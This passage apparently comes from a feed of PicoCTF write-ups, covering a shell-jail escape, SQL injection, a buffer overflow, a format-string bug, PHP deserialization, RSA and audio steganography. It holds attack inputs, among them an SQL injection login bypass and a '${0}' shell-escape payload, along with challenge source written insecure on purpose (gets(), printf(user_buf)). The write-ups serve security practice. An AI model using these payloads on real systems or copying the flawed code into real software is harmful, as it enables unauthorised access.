 let m = await WebAssembly[&amp;#34;1512517ESezaM&amp;#34;](await rpm_traffic[&amp;#34;1OsuamQ&amp;#34;]());
 let updatedEdgesById = m[&amp;#34;instance&amp;#34;];
 exports = updatedEdgesById[&amp;#34;copy_char&amp;#34;];
})();
/**
 * @return {undefined}
 */
function onButtonPress() {
 const tranfer_fn = tranfer_fn;
 let data = document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;exports&amp;#34;)[&amp;#34;924408cukzgO&amp;#34;];
 for (let i = 0; i &amp;lt; data[&amp;#34;result&amp;#34;]; i++) {
 exports[&amp;#34;1383842SQRPPf&amp;#34;](data[&amp;#34;charCodeAt&amp;#34;](i), i);
 }
 exports[&amp;#34;1383842SQRPPf&amp;#34;](0, data[&amp;#34;result&amp;#34;]);
 if (exports[&amp;#34;input&amp;#34;]() == 1) {
 document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;418508cLDohp&amp;#34;] = &amp;#34;270328ewawLo&amp;#34;;
 } else {
 document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;innerHTML&amp;#34;] = &amp;#34;check_flag&amp;#34;;
 }
}
;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Special &amp; Specialer</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---special--specialer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---special--specialer/</guid><description>&lt;h1 id="picoctf---special--specialer">
 PicoCTF - Special &amp;amp; Specialer
 &lt;a class="anchor" href="#picoctf---special--specialer">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skill">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skill&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skill">#&lt;/a>
&lt;/h6>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這兩題都蠻有趣的，感覺打提權應該會用到，所以一起紀錄，第一題是要get shell，關於這一題我是直接看學長之前解題的WP，payload是&lt;code>${0}&lt;/code>就直接拿到shell了，詳細的原理我也不清楚，第二題比較簡單，就直接用網路的資源替換一下&lt;code>ls, cat&lt;/code>這兩個指令就拿到flag了&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>代替&lt;code>cat&lt;/code>的方法：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#66d9ef">while&lt;/span> read line; &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; echo $line;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; &lt;span style="color:#66d9ef">done&lt;/span> &amp;lt;&lt;span style="color:#f92672">{&lt;/span>filename&lt;span style="color:#f92672">}}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ exec 3&amp;lt;&lt;span style="color:#f92672">{&lt;/span>filename&lt;span style="color:#f92672">}}&lt;/span> &lt;span style="color:#75715e"># Assign file descriptor 3 for reading&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#66d9ef">while&lt;/span> read -u &lt;span style="color:#ae81ff">3&lt;/span> line; &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; echo $line
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span>&amp;gt; &lt;span style="color:#66d9ef">done&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>&amp;lt;&lt;span style="color:#f92672">{&lt;/span>filename&lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>代替&lt;code>ls&lt;/code>的方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo */*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo * .*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ dir
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ printf &lt;span style="color:#e6db74">&amp;#39;%s\n&amp;#39;&lt;/span> *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ grep -l &lt;span style="color:#e6db74">&amp;#39;.*&amp;#39;&lt;/span> ./*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ find .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stat -c &lt;span style="color:#e6db74">&amp;#39;%s %A %n&amp;#39;&lt;/span> *
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 9&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ lsattr ./*
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Method 10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim .
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://jarv.org/posts/cat-without-cat/">Cat without cat on the commandline&lt;/a>
&lt;a href="https://ubunlog.com/en/alternativas-al-comando-ls/">Alternatives to the &amp;rsquo;ls&amp;rsquo; command to list the contents of a directory&lt;/a>&lt;/p></description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</guid><description>&lt;h1 id="picoctf---sqlilite">
 PicoCTF - SQLiLite
 &lt;a class="anchor" href="#picoctf---sqlilite">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://saturn.picoctf.net:55837/">http://saturn.picoctf.net:55837/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - sqli
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;p>Payload:
&lt;code>admin' or '1'='1' -- #&lt;/code>
&lt;img src="https://i.imgur.com/yNgpTiY.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - SRA</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---sra/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---sra/</guid><description>&lt;h1 id="picoctf---sra">
 PicoCTF - SRA
 &lt;a class="anchor" href="#picoctf---sra">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import getPrime, inverse, bytes_to_long
from string import ascii_letters, digits
from random import choice

pride = &amp;#34;&amp;#34;.join(choice(ascii_letters + digits) for _ in range(16))
gluttony = getPrime(128)
greed = getPrime(128)
lust = gluttony * greed
sloth = 65537
envy = inverse(sloth, (gluttony - 1) * (greed - 1))

anger = pow(bytes_to_long(pride.encode()), sloth, lust)

print(f&amp;#34;{anger = }&amp;#34;)
print(f&amp;#34;{envy = }&amp;#34;)

print(&amp;#34;vainglory?&amp;#34;)
vainglory = input(&amp;#34;&amp;gt; &amp;#34;).strip()

if vainglory == pride:
 print(&amp;#34;Conquered!&amp;#34;)
 with open(&amp;#34;/challenge/flag.txt&amp;#34;) as f:
 print(f.read())
else:
 print(&amp;#34;Hubris!&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - stack cache</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stack-cache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stack-cache/</guid><description>&lt;h1 id="picoctf---stack-cache">
 PicoCTF - stack cache
 &lt;a class="anchor" href="#picoctf---stack-cache">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;wchar.h&amp;gt;
#include &amp;lt;locale.h&amp;gt;

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
 char buf[FLAGSIZE];
 char filler[BUFSIZE];
 FILE *f = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if (f == NULL) {
 printf(&amp;#34;%s %s&amp;#34;, &amp;#34;Please create &amp;#39;flag.txt&amp;#39; in this directory with your&amp;#34;,
 &amp;#34;own debugging flag.\n&amp;#34;);
 exit(0);
 }

 fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
 // this function is under construction
 char consideration[BUFSIZE];
 char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = &amp;#34;Enter names&amp;#34;;
	// *q = &amp;#34;Name 1&amp;#34;;
	// *r = &amp;#34;Name 2&amp;#34;;
 unsigned long *age;
	printf(&amp;#34;User information : %p %p %p %p %p %p\n&amp;#34;,demographic, location, identification, session, votes, dependents);
	printf(&amp;#34;Names of user: %p %p %p\n&amp;#34;, p,q,r);
 printf(&amp;#34;Age of user: %p\n&amp;#34;,age);
 fflush(stdout);
}

void vuln(){
 char buf[INPSIZE];
 printf(&amp;#34;Give me a string that gets you the flag\n&amp;#34;);
 gets(buf);
 printf(&amp;#34;%s\n&amp;#34;,buf);
 return;
}

int main(int argc, char **argv){

 setvbuf(stdout, NULL, _IONBF, 0);
 // Set the gid to the effective gid
 // this prevents /bin/sh from dropping the privileges
 gid_t gid = getegid();
 setresgid(gid, gid, gid);
 vuln();
 printf(&amp;#34;Bye!&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Stonk Market</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stonk-market/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stonk-market/</guid><description>&lt;h1 id="picoctf---stonk-market">
 PicoCTF - Stonk Market
 &lt;a class="anchor" href="#picoctf---stonk-market">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>FMT&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf(&amp;#34;\nPortfolio as of &amp;#34;);
	fflush(stdout);
	system(&amp;#34;date&amp;#34;); // TODO: implement this in C
	fflush(stdout);

	printf(&amp;#34;\n\n&amp;#34;);
	Stonk *head = p-&amp;gt;head;
	if (!head) {
		printf(&amp;#34;You don&amp;#39;t own any stonks!\n&amp;#34;);
	}
	while (head) {
		printf(&amp;#34;%d shares of %s\n&amp;#34;, head-&amp;gt;shares, head-&amp;gt;symbol);
		head = head-&amp;gt;next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares &amp;lt; 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk-&amp;gt;shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i &amp;lt;= MAX_SYM_LEN; i++) {
		if (i &amp;lt; AI_symbol_len) {
			stonk-&amp;gt;symbol[i] = &amp;#39;A&amp;#39; + (rand() % 26);
		} else {
			stonk-&amp;gt;symbol[i] = &amp;#39;\0&amp;#39;;
		}
	}

	stonk-&amp;gt;next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen(&amp;#34;api&amp;#34;,&amp;#34;r&amp;#34;);
	if (!f) {
		printf(&amp;#34;Flag file not found\n&amp;#34;);
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p-&amp;gt;money;
	int shares = 0;
	Stonk *temp = NULL;
	printf(&amp;#34;Using patented AI algorithms to buy stonks\n&amp;#34;);
	while (money &amp;gt; 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp-&amp;gt;next = p-&amp;gt;head;
		p-&amp;gt;head = temp;
		money -= shares;
	}
	printf(&amp;#34;Stonks chosen\n&amp;#34;);

	char *user_buf = malloc(300 + 1);
	printf(&amp;#34;What is your API token?\n&amp;#34;);
	scanf(&amp;#34;%300s&amp;#34;, user_buf);
	printf(&amp;#34;Buying stonks with token:\n&amp;#34;);
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p-&amp;gt;money = (rand() % 2018) + 1;
	p-&amp;gt;head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p-&amp;gt;head;
	Stonk *next = NULL;
	while (current) {
		next = current-&amp;gt;next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf(&amp;#34;Memory failure\n&amp;#34;);
		exit(1);
	}

	int resp = 0;

	printf(&amp;#34;Welcome back to the trading app!\n\n&amp;#34;);
	printf(&amp;#34;What would you like to do?\n&amp;#34;);
	printf(&amp;#34;1) Buy some stonks!\n&amp;#34;);
	printf(&amp;#34;2) View my portfolio\n&amp;#34;);
	scanf(&amp;#34;%d&amp;#34;, &amp;amp;resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf(&amp;#34;Goodbye!\n&amp;#34;);

	exit(0);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</guid><description>&lt;h1 id="picoctf---super-serial">
 PicoCTF - Super Serial
 &lt;a class="anchor" href="#picoctf---super-serial">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/B1I5n1pns">php unserialization&lt;/a>&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>The flag is at ../flag&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化&lt;/p>
&lt;ol>
&lt;li>
&lt;p>robot.txt
一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是&lt;code>sqli&lt;/code>，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且&lt;code>/admin.phps&lt;/code>沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析
&lt;img src="https://hackmd.io/_uploads/BkcThh0Pn.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>index.phps
用index.phps查看source code發現有一些其他怪東西，包括&lt;code>authentication.phps&lt;/code>和&lt;code>cookie.php&lt;/code>
:::spoiler Real Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
require_once(&amp;#34;cookie.php&amp;#34;);

if(isset($_POST[&amp;#34;user&amp;#34;]) &amp;amp;&amp;amp; isset($_POST[&amp;#34;pass&amp;#34;])){
 $con = new SQLite3(&amp;#34;../users.db&amp;#34;);
 $username = $_POST[&amp;#34;user&amp;#34;];
 $password = $_POST[&amp;#34;pass&amp;#34;];
 $perm_res = new permissions($username, $password);
 if ($perm_res-&amp;gt;is_guest() || $perm_res-&amp;gt;is_admin()) {
 setcookie(&amp;#34;login&amp;#34;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &amp;#34;/&amp;#34;);
 header(&amp;#34;Location: authentication.php&amp;#34;);
 die();
 } else {
 $msg = &amp;#39;&amp;lt;h6 class=&amp;#34;text-center&amp;#34; style=&amp;#34;color:red&amp;#34;&amp;gt;Invalid Login.&amp;lt;/h6&amp;gt;&amp;#39;;
 }
}
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;link href=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; integrity=&amp;#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;
&amp;lt;link href=&amp;#34;style.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
&amp;lt;script src=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&amp;#34; integrity=&amp;#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
 &amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;row&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;col-sm-9 col-md-7 col-lg-5 mx-auto&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;card card-signin my-5&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
 &amp;lt;h5 class=&amp;#34;card-title text-center&amp;#34;&amp;gt;Sign In&amp;lt;/h5&amp;gt;
 &amp;lt;?php if (isset($msg)) echo $msg; ?&amp;gt;
 &amp;lt;form class=&amp;#34;form-signin&amp;#34; action=&amp;#34;index.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user&amp;#34; name=&amp;#34;user&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Username&amp;#34; required autofocus&amp;gt;
 &amp;lt;label for=&amp;#34;user&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;pass&amp;#34; name=&amp;#34;pass&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Password&amp;#34; required&amp;gt;
 &amp;lt;label for=&amp;#34;pass&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;button class=&amp;#34;btn btn-lg btn-primary btn-block text-uppercase&amp;#34; type=&amp;#34;submit&amp;#34;&amp;gt;Sign in&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Surfing the Waves</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/audio/picoctf---surfing-the-waves/</guid><description>&lt;h1 id="picoctf---surfing-the-waves">
 PicoCTF - Surfing the Waves
 &lt;a class="anchor" href="#picoctf---surfing-the-waves">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/117?category=4&amp;amp;page=3">Surfing the Waves&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>While you&amp;rsquo;re going through the FBI&amp;rsquo;s servers, you stumble across their incredible taste in music. One &lt;a href="https://mercury.picoctf.net/static/cf917a179937f814d966e53bb1fd4b90/main.wav">main.wav&lt;/a> you found is particularly interesting, see if you can find the flag!
Hint:&lt;/p>
&lt;ul>
&lt;li>Music is cool, but what other kinds of waves are there?&lt;/li>
&lt;li>Look deep below the surface&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---通靈">
 Exploit - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Audacity to Analyze
The sound seems quite normal but when you zoom in the audio track, it looks like something encode.
&lt;img src="https://i.imgur.com/D1H1jpU.png" alt="" />&lt;/li>
&lt;li>Read it - &lt;code>scipy.io&lt;/code>
Use &lt;code>scipy.io&lt;/code> library to read it and print the data out.
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">&amp;gt;&amp;gt;&amp;gt; from scipy.io.wavfile import read
&amp;gt;&amp;gt;&amp;gt; rate, data = read(&amp;#34;./main.wav&amp;#34;)
&amp;gt;&amp;gt;&amp;gt; print(data)
[2007 2503 2005 ... 4503 4501 7501]
&amp;gt;&amp;gt;&amp;gt; import numpy as np
&amp;gt;&amp;gt;&amp;gt; print(np.unique(data))
[1000 1001 1002 1003 1004 1005 1006 1007 1008 1009 1500 1501 1502 1503
 1504 1505 1506 1507 1508 1509 2000 2001 2002 2003 2004 2005 2006 2007
 2008 2009 2500 2501 2502 2503 2504 2505 2506 2507 2508 2509 3000 3001
 3002 3003 3004 3005 3006 3007 3008 3009 3500 3501 3502 3503 3504 3505
 3506 3507 3508 3509 4000 4001 4002 4003 4004 4005 4006 4007 4008 4009
 4500 4501 4502 4503 4504 4505 4506 4507 4508 4509 5000 5001 5002 5003
 5004 5005 5006 5007 5008 5009 5500 5501 5502 5503 5504 5505 5506 5507
 5508 5509 6000 6001 6002 6003 6004 6005 6006 6007 6008 6009 6500 6501
 6502 6503 6504 6505 6506 6507 6508 6509 7000 7001 7002 7003 7004 7005
 7006 7007 7008 7009 7500 7501 7502 7503 7504 7505 7506 7507 7508 7509
 8000 8001 8002 8003 8004 8005 8006 8007 8008 8009 8500 8501 8502 8503
 8504 8505 8506 8507 8508 8509]
&lt;/code>&lt;/pre>Seems it has some rule $\to$
&lt;code>1000 ~ 1009&lt;/code>
&lt;code>1500 ~ 1509&lt;/code>
&lt;code>2000 ~ 2009&lt;/code>
&amp;hellip;
&lt;code>8500 ~ 8509&lt;/code>
It has exactly 16 intervals $\to$ hex value&lt;/li>
&lt;li>Let&amp;rsquo;s try to exploit it&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Whole exploit
:::spoiler exploit
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from scipy.io.wavfile import read
from tqdm import trange

path = &amp;#39;.&amp;#39;
rate, data = read(path + &amp;#34;/main.wav&amp;#34;)

decode_dic = {
 10 : &amp;#34;0&amp;#34;,
 15 : &amp;#34;1&amp;#34;,
 20 : &amp;#34;2&amp;#34;,
 25 : &amp;#34;3&amp;#34;,
 30 : &amp;#34;4&amp;#34;,
 35 : &amp;#34;5&amp;#34;,
 40 : &amp;#34;6&amp;#34;,
 45 : &amp;#34;7&amp;#34;,
 50 : &amp;#34;8&amp;#34;,
